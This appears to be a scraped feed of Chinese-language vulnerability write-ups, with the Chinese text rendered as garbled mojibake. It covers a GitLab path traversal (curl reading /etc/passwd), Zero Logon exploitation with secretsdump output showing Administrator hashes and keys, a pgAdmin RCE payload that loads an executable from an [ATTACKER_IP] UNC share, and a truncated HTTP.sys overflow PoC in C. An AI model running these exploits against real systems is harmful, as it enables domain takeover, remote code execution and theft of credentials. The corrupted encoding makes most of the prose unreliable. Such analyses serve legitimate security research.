åŒ¹é…ä¸€ä¸ªæˆ–ä¸¤ä¸ªä»»æ„å­—ç¬¦ï¼Œå¹¶å°†å…¶ä½œä¸ºä¸€ä¸ªåˆ†ç»„ \\z åŒ¹é…å­—ç¬¦ä¸²çš„ç»“å°¾ | æˆ– \\A..\\[/\\\\] åŒ¹é…ä»¥\u0026#34;../\u0026#34;å¼€å¤´çš„å­—ç¬¦ä¸² | æˆ– [/\\\\]..\\z åŒ¹é…ä»¥\u0026#34;/..\u0026#34;ç»“å°¾çš„å­—ç¬¦ä¸² | æˆ– [/\\\\]..\\[/\\\\] åŒ¹é…\u0026#34;/../\u0026#34;æˆ–\u0026#34;\\..\\\u0026#34;è¿™æ ·ä»¥\u0026#34;/\u0026#34;æˆ–\u0026#34;\\\u0026#34;å¼€å¤´ä¸”ä»¥\u0026#34;/\u0026#34;æˆ–\u0026#34;\\\u0026#34;ç»“å°¾çš„å­—ç¬¦ä¸² | æˆ– \\n åŒ¹é…æ¢è¡Œç¬¦ ) åˆ†ç»„ç»“æŸ å…¶ä¸­ï¼Œ\\Aã€\\zå’Œ\\nåˆ†åˆ«ä»£è¡¨å­—ç¬¦ä¸²çš„å¼€å¤´ã€ç»“å°¾å’Œæ¢è¡Œç¬¦ï¼Œ|è¡¨ç¤ºæˆ–çš„å…³ç³»ï¼Œ[/\\\\]ç”¨æ¥åŒ¹é…\u0026#34;\u0026#34;æˆ–\u0026#34;/\u0026#34;è¿™ä¸¤ç§ç›®å½•åˆ†éš”ç¬¦ï¼Œå› ä¸ºåœ¨ä¸åŒçš„æ“ä½œç³»ç»Ÿä¸­ï¼Œç›®å½•åˆ†éš”ç¬¦æ˜¯ä¸åŒçš„ã€‚ è¿™ä¸ªæ­£åˆ™è¡¨è¾¾å¼çš„ä½œç”¨æ˜¯åŒ¹é…ä¸€ä¸ªç›¸å¯¹è·¯å¾„å­—ç¬¦ä¸²ï¼Œç”¨æ¥æ£€æµ‹æ˜¯å¦å­˜åœ¨ä¸åˆæ³•çš„ç›¸å¯¹è·¯å¾„ï¼Œä¾‹å¦‚è·¯å¾„ä¸­åŒ…å«è¶…å‡ºæ ¹ç›®å½•çš„\u0026#34;../\u0026#34;æˆ–è€…\u0026#34;..\u0026#34;è¿™æ ·çš„å­—ç¬¦ä¸²ï¼Œæˆ–è€…ä»¥\u0026#34;../\u0026#34;å¼€å¤´æˆ–ä»¥\u0026#34;/..\u0026#34;ç»“å°¾ã€‚å¦‚æœåŒ¹é…æˆåŠŸï¼Œè¯´æ˜è¯¥è·¯å¾„å­˜åœ¨ä¸åˆæ³•çš„ç›¸å¯¹è·¯å¾„ï¼Œéœ€è¦è¿›è¡Œå¤„ç†æˆ–æŠ¥é”™ã€‚ è¡¥ä¸è¿˜ä»¥ä¸‹è·¯å¾„æ–°å¢äº†æ–‡ä»¶ï¼Œä¸éš¾çœ‹å‡ºæ˜¯åœ¨å®šä¹‰äº†moduleå’Œuploadå¯¹è±¡ï¼Œè€Œåå®šä¹‰äº†ä¸€ä¸ªå­—ç¬¦ä¸²show_pathå¹¶æŠŠå®ƒä¼ ç»™äº†config/routes/uploads.rbæ‰§è¡Œã€‚\nspec\\requests\\uploads_controller_spec.rb # frozen_string_literal: true require \u0026#39;spec_helper\u0026#39; RSpec.describe UploadsController, feature_category: :shared do include WorkhorseHelpers it_behaves_like \u0026#39;uploads actions\u0026#39; do let_it_be(:model) { create(:personal_snippet, :public) } let_it_be(:upload) { create(:upload, :personal_snippet_upload, :with_file, model: model) } # See config/routes/uploads.rb let(:show_path) do \u0026#34;/uploads/-/system/#{model.model_name.singular}/#{model.to_param}/#{upload.secret}/#{File.basename(upload.path)}\u0026#34; end end end åœ¨config/routes/uploads.rbä¸­ï¼Œå®šä¹‰äº†è·¯ç”±åŒ¹é…è§„åˆ™ç”¨æ¥å¤„ç†ä¸Šä¼ æ–‡ä»¶å’Œæ˜¾ç¤ºæ–‡ä»¶çš„è¯·æ±‚ï¼Œç»“åˆspec\\requests\\uploads_controller_spec.rbçš„å†…å®¹å¯ä»¥çŸ¥é“åº”è¯¥æ˜¯åœ¨å¤„ç†è·¯ç”±get '-/system/:model/:id/:secret/:filename'æ—¶ï¼Œå°†æ–‡ä»¶åä¼ ç»™uploadsæ¨¡å—çš„showæ–¹æ³•è§¦å‘æ¼æ´ã€‚\nconfig/routes/uploads.rb # frozen_string_literal: true scope path: :uploads do # Note attachments and User/Group/Project/Topic avatars get \u0026#34;-/system/:model/:mounted_as/:id/:filename\u0026#34;, to: \u0026#34;uploads#show\u0026#34;, constraints: { model: %r{note|user|group|project|projects\\/topic|achievements\\/achievement}, mounted_as: /avatar|attachment/, filename: %r{[^/]+} } # show uploads for models, snippets (notes) available for now get \u0026#39;-/system/:model/:id/:secret/:filename\u0026#39;, to: \u0026#39;uploads#show\u0026#39;, constraints: { model: /personal_snippet|user/, id: /\\d+/, filename: %r{[^/]+} } # show temporary uploads get \u0026#39;-/system/temp/:secret/:filename\u0026#39;, to: \u0026#39;uploads#show\u0026#39;, constraints: { filename: %r{[^/]+} } # Appearance get \u0026#34;-/system/:model/:mounted_as/:id/:filename\u0026#34;, to: \u0026#34;uploads#show\u0026#34;, constraints: { model: /appearance/, mounted_as: /logo|header_logo|pwa_icon|favicon/, filename: /.+/ }, as: \u0026#39;appearance_upload\u0026#39; # create uploads for models, snippets (notes) available for now post \u0026#39;:model\u0026#39;, to: \u0026#39;uploads#create\u0026#39;, constraints: { model: /personal_snippet|user/, id: /\\d+/ }, as: \u0026#39;upload\u0026#39; post \u0026#39;:model/authorize\u0026#39;, to: \u0026#39;uploads#authorize\u0026#39;, constraints: { model: /personal_snippet|user/ } # Alert Metric Images get \u0026#34;-/system/:model/:mounted_as/:id/:filename\u0026#34;, to: \u0026#34;uploads#show\u0026#34;, constraints: { model: /alert_management_metric_image/, mounted_as: /file/, filename: %r{[^/]+} }, as: \u0026#39;alert_metric_image_upload\u0026#39; # Abuse Reports Images get \u0026#34;-/system/:model/:mounted_as/:id/:filename\u0026#34;, to: \u0026#34;uploads#show\u0026#34;, constraints: { model: /abuse_report/, mounted_as: /screenshot/, filename: %r{[^/]+} }, as: \u0026#39;abuse_report_upload\u0026#39; end # Redirect old note attachments path to new uploads path. get \u0026#34;files/note/:id/:filename\u0026#34;, to: redirect(\u0026#34;uploads/note/attachment/%{id}/%{filename}\u0026#34;), constraints: { filename: %r{[^/]+} } å‘ç‚¹ ç»„å±‚æ•°ä¸å¤Ÿ\nåŸå…ˆæŒ‰ç…§å®˜æ–¹é€šå‘Šè¯´çš„è‡³å°‘5å±‚ç»„åµŒå¥—ï¼Œå°±åªæ–°å»ºäº†5å±‚ï¼Œè€Œåå‘é€payloadï¼Œä¸€ç›´æŠ¥400ï¼Œä¸€åº¦ä»¥ä¸ºç¯å¢ƒæ˜¯16.0.1ä¿®å¤ç‰ˆæœ¬ï¼Œè€Œåå‘ç°æ˜¯åµŒå¥—ä¸å¤Ÿã€‚\n$ curl http://192.168.59.197/g1/g2/g3/g4/g5/p1/uploads/dec19360ec8b52993908879181719de3/%2E%2E%2F%2E%2E%2F%2E%2E%2F%2E%2E%2F%2E%2E%2F%2E%2E%2F%2E%2E%2F%2E%2E%2F%2E%2E%2F%2E%2E%2F%2E%2E%2Fetc%2Fpasswd%20 \u0026lt;html\u0026gt; \u0026lt;head\u0026gt;\u0026lt;title\u0026gt;400 Bad Request\u0026lt;/title\u0026gt;\u0026lt;/head\u0026gt; \u0026lt;body\u0026gt; \u0026lt;center\u0026gt;\u0026lt;h1\u0026gt;400 Bad Request\u0026lt;/h1\u0026gt;\u0026lt;/center\u0026gt; \u0026lt;hr\u0026gt;\u0026lt;center\u0026gt;nginx\u0026lt;/center\u0026gt; \u0026lt;/body\u0026gt; \u0026lt;/html\u0026gt; åæ¥å¾—åˆ°åŒäº‹æç¤ºï¼Œéœ€è¦è‡³å°‘9å±‚æ‰å¯ä»¥è®¿é—®åˆ°æ ¹ç›®å½•ã€‚\nç©¿è¶Šç¬¦ä¸å¤Ÿ\nç»æµ‹è¯•ï¼Œè‡³å°‘éœ€è¦12ä¸ªç©¿è¶Šç¬¦../ æ‰èƒ½æˆåŠŸç©¿è¶Šåˆ°æ ¹ç›®å½•\nå°ç»“\næœ¬æ¬¡æ¼æ´åˆ†ææœ‰ç‚¹äº‹åè¯¸è‘›äº®ï¼Œä»å·²çŸ¥çš„PoCæ¨æµ‹è§¦å‘çš„æ–‡ä»¶è·¯å¾„ï¼Œä½†æ€»ç®—æˆåŠŸç†è§£äº†æ•´ä¸ªè§¦å‘æ–‡ä»¶æµï¼Œå‘ç‚¹å°±æ˜¯nginxè§£æå¯¼è‡´éœ€è¦è¶³å¤Ÿçš„groupæ‰èƒ½ç©¿è¶Šåˆ°æ ¹ç›®å½•ï¼Œåˆ†æè¿™ä¸ªæ¼æ´çš„æ—¶å€™æ²¡å­¦è¿‡rubyï¼Œä¾é ChatGPTæ‰èƒ½å¤Ÿç†è§£æŸäº›ä»£ç ã€‚\nCreated at 2023-05-26T10:36:20+08:00\n"},{"uri":"https://www.ch35tnut.site/zh-cn/vulnerability/zero-logon/","title":"Zero Logon åˆ†æ","tags":[],"description":"","content":"åŸºæœ¬ä¿¡æ¯ Netlogonåè®®è®¤è¯è¿‡ç¨‹ï¼š å½±å“ç‰ˆæœ¬ ç•¥\nç¯å¢ƒæ­å»º win server 2012 æŠ€æœ¯åˆ†æ\u0026amp;è°ƒè¯• åˆ©ç”¨ åŸŸç¯å¢ƒä½¿ç”¨Windows server 2012R2æ­å»ºï¼Œå…ˆç”¨\rè„šæœ¬é‡ç½®åŸŸè´¦æˆ·å¯†ç  python cve-2020-1472-exploit.py WIN2016 192.168.52.130 å¹¶æŠ“å–æ•°æ®åŒ… é‡ç½®ä¹‹ååŸŸè´¦æˆ·çš„å¯†ç ä¸ºç©ºï¼Œå¯¹åº”hashä¸º31d6cfe0d16ae931b73c59d7e0c089c0\nå®‰è£…impacketï¼š\npython3 -m pipx install impacket pipx ensurepath ä½¿ç”¨impacketçš„secretsdumpè¿›è¡ŒDcsyncï¼Œå¾—åˆ°Administratrè´¦æˆ·çš„NTLM hash secretsdump.py cqy.io/WIN2016\\$@WIN2016 -dc-ip 192.168.52.130 -just-dc-user cqy\\\\administrator -hashes 31d6cfe0d16ae931b73c59d7e0c089c0:31d6cfe0d16ae931b73c59d7e0c089c0 Impacket v0.10.0 - Copyright 2022 SecureAuth Corporation [*] Dumping Domain Credentials (domain\\uid:rid:lmhash:nthash) [*] Using the DRSUAPI method to get NTDS.DIT secrets Administrator:500:aad3b435b51404eeaad3b435b51404ee:668d503af91aefe071e37a16e885047b::: [*] Kerberos keys grabbed Administrator:aes256-cts-hmac-sha1-96:8996ffd41ae52dd62a3c60007d078f10eb7cd3eb5d4b74c90791c8e47eba88cb Administrator:aes128-cts-hmac-sha1-96:a3a6d348e74cee613718c2f94d404fb6 Administrator:des-cbc-md5:f732d313b5e92585 [*] Cleaning up... PoCåˆ†æ å…³é”®ä»£ç æ˜¯ä¸‹é¢è¿™ä¸ªå‡½æ•°ï¼Œå‚æ•°rpc_conæ˜¯DCERPC_v5å¯¹è±¡ï¼Œæè¿°äº†rcpé“¾æ¥ï¼Œ\nfor attempt in range(0, MAX_ATTEMPTS): result = try_zero_authenticate(rpc_con, dc_handle, dc_ip, target_computer) if result is None: print(\u0026#39;=\u0026#39;, end=\u0026#39;\u0026#39;, flush=True) else: break def try_zero_authenticate(rpc_con, dc_handle, dc_ip, target_computer): # Connect to the DC\u0026#39;s Netlogon service. # Use an all-zero challenge and credential. plaintext = b\u0026#39;\\x00\u0026#39; * 8 ciphertext = b\u0026#39;\\x00\u0026#39; * 8 # Standard flags observed from a Windows 10 client (including AES), with only the sign/seal flag disabled. flags = 0x212fffff # Send challenge and authentication request. nrpc.hNetrServerReqChallenge(rpc_con, dc_handle + \u0026#39;\\x00\u0026#39;, target_computer + \u0026#39;\\x00\u0026#39;, plaintext) try: server_auth = nrpc.hNetrServerAuthenticate3( rpc_con, dc_handle + \u0026#39;\\x00\u0026#39;, target_computer + \u0026#39;$\\x00\u0026#39;, nrpc.NETLOGON_SECURE_CHANNEL_TYPE.ServerSecureChannel, target_computer + \u0026#39;\\x00\u0026#39;, ciphertext, flags ) # It worked! assert server_auth[\u0026#39;ErrorCode\u0026#39;] == 0 return True except nrpc.DCERPCSessionError as ex: # Failure should be due to a STATUS_ACCESS_DENIED error. Otherwise, the attack is probably not working. if ex.get_error_code() == 0xc0000022: return None else: fail(f\u0026#39;Unexpected error code from DC: {ex.get_error_code()}.\u0026#39;) except BaseException as ex: fail(f\u0026#39;Unexpected error: {ex}.\u0026#39;) åœ¨PoCä¸­å¾ªç¯å‘èµ·è®¤è¯ï¼Œæ¯æ¬¡è®¤è¯æ—¶ï¼Œclient challengeç½®ä¸º0x00 * 8ï¼Œclient credentialç½®ä¸º0x00 * 8 åœ¨\rnetlogonåè®®ä¸­çŸ¥é“ï¼ŒæœåŠ¡å™¨ä¼šæ¯”è¾ƒè‡ªå·±è®¡ç®—çš„ClientCredentialå’Œå®¢æˆ·ç«¯å‘è¿‡æ¥çš„ClientCredentialæ˜¯å¦ç›¸ç­‰ï¼Œè€ŒClientCredentialæ¥æºäºä¼šè¯å¯†é’¥åŠ å¯†ClientChallengeã€‚å…¶ä¸­åŠ å¯†ç®—æ³•ä¸ºAESï¼Œä½¿ç”¨CFB8æ¨¡å¼ã€‚è¯¥ç®—æ³•è¿‡ç¨‹å¦‚ä¸‹ï¼š ç®—æ³•æ­¥éª¤ï¼š\nç¡®å®šä¸€ä¸ª16å­—èŠ‚çš„åˆå§‹å‘é‡IVã€‚ å°†IVå’Œæ˜æ–‡ç»„åˆ,ä¾‹å¦‚IV + æ˜æ–‡çš„å‰16ä¸ªå­—èŠ‚ã€‚ å¯¹ç»„åˆçš„æ•°æ®å—è¿›è¡ŒAESåŠ å¯†,è¾“å‡ºä¸€ä¸ª16å­—èŠ‚çš„å¯†æ–‡å—ã€‚ ä»å¯†æ–‡å—çš„ç¬¬ä¸€ä¸ªå­—èŠ‚,ä¸æ˜æ–‡çš„ç¬¬ä¸€ä¸ªå­—èŠ‚è¿›è¡Œå¼‚æˆ–,å¾—åˆ°å¯†æ–‡çš„ç¬¬ä¸€ä¸ªå­—èŠ‚ã€‚ å¯†æ–‡çš„ç¬¬ä¸€ä¸ªå­—èŠ‚ä¸IVçš„ç¬¬ä¸€ä¸ªå­—èŠ‚ç»„åˆ,å½¢æˆä¸€ä¸ªæ–°çš„16å­—èŠ‚å€¼ã€‚ å¯¹è¿™ä¸ªæ–°çš„å€¼å†æ¬¡è¿›è¡ŒAESåŠ å¯†,å¾—åˆ°ä¸‹ä¸€ä¸ª16å­—èŠ‚å¯†æ–‡å—ã€‚ ä»æ–°å¯†æ–‡å—å–ç¬¬ä¸€ä¸ªå­—èŠ‚,ä¸æ˜æ–‡çš„ä¸‹ä¸€ä¸ªå­—èŠ‚å¼‚æˆ–,ç”Ÿæˆå¯†æ–‡çš„ä¸‹ä¸€ä¸ªå­—èŠ‚ã€‚ é‡å¤æ­¥éª¤5-7,ç›´åˆ°æ‰€æœ‰æ˜æ–‡éƒ½è¢«åŠ å¯†ã€‚ è‹¥æ˜æ–‡ä¸è¶³16çš„å€æ•°å­—èŠ‚,å‰©ä½™æ˜æ–‡ä½¿ç”¨PKCS7Paddingè¿›è¡Œå¡«å……ã€‚ AES-CFB8é€šè¿‡å‰ä¸€ä¸ªå¯†æ–‡å—çš„åé¦ˆæ¥å½±å“ä¸‹ä¸€ä¸ªæ˜æ–‡å—çš„åŠ å¯†,ä»è€Œé¿å…äº†ECBæ¨¡å¼çš„ç¡®å®šæ€§é—®é¢˜ã€‚ä½†å¿…é¡»ä½¿ç”¨éšæœºçš„IVæ¥ä¿è¯å®‰å…¨æ€§ã€‚\nä¼šè¯å¯†é’¥è®¡ç®—å…¬å¼ï¼šKDF(ClientChallenge+ServerChallenge+secret)ï¼Œåœ¨æ¯ä¸€è½®è®¤è¯è¿‡ç¨‹ä¸­ï¼ŒServerChallengeéƒ½ä¼šå˜åŒ–ï¼Œä½†Windowsä¸­å®ç°çš„AES-CFB8ä½¿ç”¨çš„ivè¢«è®¾ä¸º16å­—èŠ‚çš„0x00 æ”»å‡»è€…å¯æ§ClientChallengeå’ŒClientCredentialï¼ŒCLientChallengeå¯¹åº”äºè“è‰²éƒ¨åˆ†ã€‚ç”±äºè½®è®¤è¯æ—¶ServerChallengeéƒ½ä¼šæ”¹å˜ä¸”ä¸ä¼šé‡å¤ï¼Œæ‰€ä»¥æ¯æ¬¡è®¡ç®—å‡ºçš„ä¼šè¯å¯†é’¥éƒ½ä¸ä¸€æ ·ã€‚å½“ClientChallengeç½®ä¸º0x00 * 8ï¼Œå½“ç¬¬ä¸€è½®è®¡ç®—æ—¶ï¼Œè®¡ç®—å‡ºçš„ç»“æœæœ‰1/256æ¦‚ç‡ä¸º0x00ï¼Œè€Œè¿™ä¸ª0x00åˆä¼šä½œä¸ºä¸‹ä¸€è½®è¾“å…¥æ·»åŠ åˆ°ivçš„ç¬¬ä¸€ä¸ªå­—èŠ‚ï¼Œå³æœ‰1/256æ¦‚ç‡è®¡ç®—åçš„ç»“æœå’Œè®¡ç®—å‰çš„å€¼ä¸€æ ·å…¨ä¸º0x00ï¼Œè¿™æ ·æ¯ä¸€è½®è®¡ç®—ç»“æœéƒ½æ˜¯å…¨ä¸º0x00ã€‚ è¿™æ ·ç¬¬ä¸€è½®è®¡ç®—ååœ¨ç®—æ³•ä¸­çš„è¾“å…¥ä¸ºå…¨0ï¼ŒåŠ å¯†å¯†é’¥ä¸å˜ï¼Œç¬¬äºŒè½®è®¡ç®—æ—¶ï¼Œç»“æœä¾ç„¶ä¼šæ˜¯0ï¼Œè¿™æ ·æœ€ç»ˆç®—æ³•ç»“æœè¾“å‡ºä¼šæ˜¯å…¨0ã€‚ ç”±äºæ¯è½®è®¤è¯è¿‡ç¨‹ä¸­ä¼šè¯å¯†é’¥éƒ½ä¸ä¸€æ ·ï¼Œæ‰€ä»¥æ¯ä¸€è½®è®¤è¯è¿‡ç¨‹æ—¶ï¼ŒAES-CFB8ç¬¬ä¸€è½®è®¡ç®—çš„ç»“æœéƒ½ä¼šä¸ä¸€æ ·ï¼Œç»“æœæœ€å¤šæœ‰256ç§æƒ…å†µï¼Œæœ€å·®çš„æƒ…å†µåœ¨ç¬¬256è½®æ—¶è®¡ç®—ç»“æœä¸º0x00ã€‚\nå½“AES-CFB8åŠ å¯†ç»“æœåˆšåˆšå¥½ä¸ºå…¨0æ—¶ï¼Œå®¢æˆ·ç«¯å‘é€çš„ClientCredentialä¹Ÿä¸ºå…¨0ï¼Œæ­¤æ—¶å°±å¯ä»¥é€šè¿‡æœåŠ¡ç«¯çš„æ ¡éªŒï¼Œå®Œæˆèº«ä»½éªŒè¯ã€‚\nå¯ä»¥ç¼–å†™ä¸€æ®µç®€å•çš„pythonä»£ç æ¨¡æ‹ŸæœåŠ¡ç«¯åŠ å¯†è¿‡ç¨‹\nfrom cryptography.hazmat.primitives.ciphers import Cipher, algorithms, modes from cryptography.hazmat.backends import default_backend import secrets iv = bytes([ 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, ]) # 16 byte IV plaintext = bytes([ 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, ]) # 8 byte plaintext for i in range(256): key = secrets.token_bytes(16) # 8 byte key cipher = Cipher(algorithms.AES(key), modes.CFB8(iv), backend=default_backend()) encryptor = cipher.encryptor() ciphertext = encryptor.update(plaintext) + encryptor.finalize() print(ciphertext.hex()) åœ¨ç¬¬115æ¬¡æ—¶ï¼ŒåŠ å¯†åçš„å¯†æ–‡ä¸º0x0000000000000000 å‚è€ƒé“¾æ¥\nhttps://xz.aliyun.com/t/8367\nhttps://www.anquanke.com/post/id/219374#h3-6\nhttps://www.secrss.com/articles/25580\nCreated at 2023-05-08T14:39:28+08:00\n"},{"uri":"https://www.ch35tnut.site/zh-cn/vulnerability/cve-2022-4223-pgadmin-rce/","title":"CVE-2022-4223 PgAdmin RCE åˆ†æ","tags":["æ¼æ´åˆ†æ"],"description":"","content":"åŸºæœ¬ä¿¡æ¯ pgAdmin æœåŠ¡å™¨åŒ…å«ä¸€ä¸ª HTTP APIï¼Œç”¨äºéªŒè¯ç”¨æˆ·é€‰æ‹©çš„å¤–éƒ¨ PostgreSQL å®ç”¨ç¨‹åºï¼ˆå¦‚ pg_dump å’Œ pg_restoreï¼‰çš„è·¯å¾„ã€‚è¯¥å®ç”¨ç¨‹åºç”±æœåŠ¡å™¨æ‰§è¡Œï¼Œä»¥ç¡®å®šå®ƒæ¥è‡ªå“ªä¸ªPostgreSQLç‰ˆæœ¬ã€‚6.17 ä¹‹å‰çš„ pgAdmin ç‰ˆæœ¬æ— æ³•æ­£ç¡®ä¿æŠ¤æ­¤ APIï¼Œè¿™å¯èƒ½å…è®¸æœªç»èº«ä»½éªŒè¯çš„ç”¨æˆ·ä½¿ç”¨ä»–ä»¬é€‰æ‹©çš„è·¯å¾„è°ƒç”¨å®ƒï¼Œä¾‹å¦‚ä»–ä»¬åœ¨ Windows è®¡ç®—æœºä¸Šæ§åˆ¶çš„æœåŠ¡å™¨çš„ UNC è·¯å¾„ã€‚è¿™å°†å¯¼è‡´ç›®æ ‡è·¯å¾„ä¸­æ­£ç¡®å‘½åçš„å¯æ‰§è¡Œæ–‡ä»¶ç”± pgAdmin æœåŠ¡å™¨æ‰§è¡Œã€‚\næŒ‡çº¹ ç•¥\nå½±å“ç‰ˆæœ¬ pgadmin \u0026lt; 6.17\nç¯å¢ƒæ­å»º windows 10 postgresql13 æŠ€æœ¯åˆ†æ\u0026amp;è°ƒè¯• å¤ç° ç›´æ¥å®‰è£…postgresql13ï¼Œè‡ªå¸¦äº†pgadmin4ï¼Œåˆå§‹åŒ–ç¯å¢ƒåï¼Œä½¿ç”¨python å¯åŠ¨pgadmin4ï¼Œç¼–è¯‘å¦‚ä¸‹ä»£ç \n#include\u0026lt;stdlib\u0026gt; int main(){ system(\u0026#34;whoami \u0026gt; c:\\\\users\\\\public\\\\1.txt\u0026#34;); return 0; } ç¼–è¯‘åå‘½åä¸ºpg_dump.exeï¼Œå°†å…¶æ”¾åˆ°æŸä¸ªç›®å½•å†…ï¼Œå¹¶å¼€å¯æ–‡ä»¶å…±äº«ã€‚ å‘é€å¦‚ä¸‹payloadï¼Œåœ¨utility_pathæŒ‡å‘å…±äº«çš„æ–‡ä»¶å¤¹è·¯å¾„ï¼Œ\nPOST /misc/validate_binary_path HTTP/1.1 Host: [TARGETHOST] Cookie: [COOKIES_YOU_FETCHED_IN_ADVANCE] X-pgA-CSRFToken: [CSRF_TOKEN_YOU_FETCHED_IN_ADVANCE] Connection: close Referer: https://[TARGETHOST]/browser/ Content-Length: [n] Content-Type: application/json {\u0026#34;utility_path\u0026#34;:\u0026#34;\\\\\\\\[ATTACKER_IP]\\\\[PREFERED_SHARE_NAME]\u0026#34;} åˆ†æ åœ¨ validate_binary_pathè·¯ç”±å¯¹åº”çš„å¤„ç†å‡½æ•°å¦‚ä¸‹ï¼Œè¿™ä¸ªå‡½æ•°æ¥æ”¶POSTè¯·æ±‚ï¼Œè€Œåè·å–åˆ°bodyé‡Œé¢çš„ utility_pathï¼Œè¿™ä¸ªå‡½æ•°æ¥æ”¶ utility_pathå¹¶ä½¿ç”¨ os.path.abspath(os.path.joinæ‹¼æ¥è·¯å¾„ï¼Œè€Œ os.path.joinå¯ä»¥æ¥å—[[UNCè·¯å¾„]]ï¼Œæ‰€ä»¥æˆ‘ä»¬å¯ä»¥æ­å»ºä¸€ä¸ªSMBæœåŠ¡å™¨å¹¶åœ¨ä¸Šé¢æœ‰ pg_dump.exeï¼Œä¼ å…¥UNCè·¯å¾„ï¼Œpgadminå°±ä¼šè·å–åˆ°è¿™ä¸ªæ–‡ä»¶å¹¶æ‰§è¡Œï¼Œå¯¼è‡´ä»£ç æ‰§è¡Œã€‚\n@blueprint.route(\u0026#34;/validate_binary_path\u0026#34;, endpoint=\u0026#34;validate_binary_path\u0026#34;, methods=[\u0026#34;POST\u0026#34;]) # [1] def validate_binary_path(): \u0026#34;\u0026#34;\u0026#34; This function is used to validate the specified utilities path by running the utilities with there versions. \u0026#34;\u0026#34;\u0026#34; data = None if hasattr(request.data, \u0026#39;decode\u0026#39;): data = request.data.decode(\u0026#39;utf-8\u0026#39;) if data != \u0026#39;\u0026#39;: data = json.loads(data) version_str = \u0026#39;\u0026#39; if \u0026#39;utility_path\u0026#39; in data and data[\u0026#39;utility_path\u0026#39;] is not None: # [2] # Check if \u0026#34;$DIR\u0026#34; present in binary path binary_path = replace_binary_path(data[\u0026#39;utility_path\u0026#39;]) # [3] for utility in UTILITIES_ARRAY: # [4] full_path = os.path.abspath( os.path.join(binary_path, (utility if os.name != \u0026#39;nt\u0026#39; else (utility + \u0026#39;.exe\u0026#39;)))) # [5] try: # Get the output of the \u0026#39;--version\u0026#39; command version_string = \\ subprocess.getoutput(\u0026#39;\u0026#34;{0}\u0026#34; --version\u0026#39;.format(full_path)) # [6] # Get the version number by splitting the result string version_string.split(\u0026#34;) \u0026#34;, 1)[1].split(\u0026#39;.\u0026#39;, 1)[0] ... è¡¥ä¸ è¡¥ä¸ä¸­å¢åŠ äº†èº«ä»½éªŒè¯ï¼Œå¹¶ä¸”åœ¨æ‹¼æ¥è·¯å¾„æ—¶ä½¿ç”¨os.path.existsæ£€æŸ¥æ˜¯å¦å­˜åœ¨ï¼Œä¸å­˜åœ¨åˆ™æŠ¥é”™ã€‚\nå°ç»“ è¿™ä¸ªæ¼æ´åŸç†è¾ƒä¸ºç®€å•ï¼Œpythonçš„å‡½æ•°å¯ä»¥æ¥æ”¶UNCè·¯å¾„ï¼Œè€Œå¼€å‘è€…å¹¶æœªè€ƒè™‘åˆ°è¿™ä¸€ç‚¹ï¼Œå¯¼è‡´å¯ä»¥ä¼ å…¥UNCè·¯å¾„è¾¾æˆè¿œç¨‹ä»£ç æ‰§è¡Œã€‚å€¼å¾—æ³¨æ„çš„æ˜¯è¿™ä¸ªæ¼æ´æ˜¯é codeqlå®¡è®¡å‡ºæ¥çš„ã€‚\nå‚è€ƒé“¾æ¥\nhttps://frycos.github.io/vulns4free/2022/12/02/rce-in-20-minutes.html\nCreated at 2023-05-08T14:18:21+08:00\n"},{"uri":"https://www.ch35tnut.site/zh-cn/vulnerability/cve-2023-23410-windows-http-sys-eop/","title":"CVE-2023-23410 Windows HTTP.sys æƒé™æå‡æ¼æ´åˆ†æ","tags":["æ¼æ´åˆ†æ"],"description":"","content":"åŸºæœ¬ä¿¡æ¯ åœ¨http.sysä¸­å­˜åœ¨æ•´æ•°æº¢å‡ºæ¼æ´ï¼Œæ”»å‡»è€…å¯ä»¥åˆ©ç”¨æ•´æ•°æº¢å‡ºæ¼æ´ç»•è¿‡å­—æ®µå¤§å°æ£€æŸ¥ï¼Œå¯¼è‡´åœ¨è°ƒç”¨memcpyæ—¶ä¼ å…¥è¶…å‡ºç¼“å†²åŒºå¤§å°çš„é•¿åº¦å‚æ•°ï¼Œé€ æˆå†…å­˜æº¢å‡ºã€‚\nç¯å¢ƒæ­å»º æ“ä½œç³»ç»Ÿ windows 10 è°ƒè¯•å™¨ windbg æŠ€æœ¯åˆ†æ\u0026amp;è°ƒè¯• PoC\n#define _WIN32_WINNT 0x0A00 #define SECURITY_WIN32 #include \u0026lt;http.h\u0026gt; #include \u0026lt;sspi.h\u0026gt; #include \u0026lt;strsafe.h\u0026gt; #pragma warning(disable : 4127) // condition expression is constant int __cdecl wmain(int argc, __in_ecount(argc) wchar_t *argv[]) { HANDLE hReqQueue = NULL; HTTPAPI_VERSION HttpApiVersion = HTTPAPI_VERSION_2; HTTP_SERVER_SESSION_ID ssID = HTTP_NULL_ID; ULONG retCode; HTTP_URL_GROUP_ID urlGroupId = HTTP_NULL_ID; // åˆå§‹åŒ–HTTPæœåŠ¡å™¨é©±åŠ¨ retCode = HttpInitialize(HttpApiVersion, HTTP_INITIALIZE_SERVER, // Flags NULL // Reserved ); if (retCode != NO_ERROR) { wprintf(L\u0026#34;HttpInitialize failed with %lu \\n\u0026#34;, retCode); return retCode; } // åˆ›å»ºæœåŠ¡ä¼šè¯ retCode = HttpCreateServerSession(HttpApiVersion, \u0026amp;ssID, 0); if (retCode != NO_ERROR) { wprintf(L\u0026#34;HttpCreateServerSession failed with %lu \\n\u0026#34;, retCode); return 0; } // åˆ›å»ºurl group retCode = HttpCreateUrlGroup(ssID, \u0026amp;urlGroupId, 0); if (retCode != NO_ERROR) { wprintf(L\u0026#34;HttpCreateUrlGroup failed with %lu \\n\u0026#34;, retCode); return 0; } BYTE data_temp1[0x1000] = {0}; DWORD return_len = 0; // åˆ†é… 0xfffffe0 å¤§å°çš„å †å— WCHAR *str = HeapAlloc(GetProcessHeap(), 0, 0xfffffe0); WCHAR str_test[0xfffe] = L\u0026#34;192.168.52.133:8081\u0026#34;; memcpy(str, str_test, 0x20); HTTP_CHANNEL_BIND_INFO bind_info; bind_info.Hardening = HttpAuthenticationHardeningLegacy; bind_info.Flags = HTTP_CHANNEL_BIND_PROXY; HTTP_SERVICE_BINDING_W service_binding; HTTP_SERVICE_BINDING_BASE binding_base; binding_base.Type = HttpServiceBindingTypeW; service_binding.Base = binding_base; service_binding.Buffer = str; service_binding.BufferSize = 0xfffffe0 - 0xf0f0f0; // F0F0EF0 PHTTP_SERVICE_BINDING_BASE binding_base_arr[0x11]; PHTTP_SERVICE_BINDING_BASE 